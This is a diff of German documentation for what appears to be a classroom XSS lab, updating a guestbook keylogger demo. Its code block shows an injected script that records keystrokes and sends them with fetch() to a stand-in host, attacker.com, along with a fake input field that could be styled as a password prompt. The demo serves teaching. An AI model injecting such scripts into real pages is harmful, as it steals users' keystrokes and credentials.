@@ -296,24 +296,39 @@ setTimeout(function() {
 1. Klicken Sie **"Angriffsdaten löschen"** (Session zurücksetzen)
 2. Klicken Sie auf **"Keylogger"**
 3. Absenden
-4. **Tippen Sie 20 Zeichen in irgendeinem Feld**
-5. **Resultat**: Alert zeigt aufgezeichnete Tasten
+4. **Im Gästebucheintrag erscheint eine rote Textarea mit Warnung**
+5. **Tippen Sie mindestens 20 Zeichen in der eingefügten Textarea**
+6. **Resultat**: Alert zeigt aufgezeichnete Tasten
 
 **Erklärung:**
 ```javascript
 <script>
 var keys = [];
 document.addEventListener('keypress', function(e) {
-    keys.push(e.key);
+    // Nur Eingaben in der injizierten Textarea aufzeichnen
+    if (e.target.id === 'keyloggerDemo') {
+        keys.push(e.key);
 
-    // In einem echten Angriff:
-    if (keys.length > 10) {
-        fetch('http://attacker.com/log.php?keys=' + keys.join(''));
-        keys = [];
+        // In einem echten Angriff:
+        if (keys.length >= 20) {
+            fetch('http://attacker.com/log.php?keys=' + keys.join(''));
+            keys = [];
+        }
     }
 });
 </script>
+
+<!-- Injizierte Textarea im Gästebucheintrag: -->
+<div style="background:#ffe5e5; border-left:4px solid #e53e3e;">
+    <strong>⚠️ Keylogger aktiv - Tippen Sie hier:</strong>
+    <textarea id="keyloggerDemo" placeholder="Text eingeben..."></textarea>
+</div>
 ```
+
+**Besonderheit dieser Demo:**
+- Der Angreifer fügt nicht nur JavaScript ein, sondern auch ein sichtbares Formularfeld
+- Das Textfeld tarnt sich als "Kommentar-Funktion" oder "Antwort-Feld"
+- In der Realität würde das Feld unauffälliger gestaltet sein (z.B. "Passwort eingeben um fortzufahren")
 
 **Diskussion:**
 - "Alle Tastatureingaben werden aufgezeichnet"
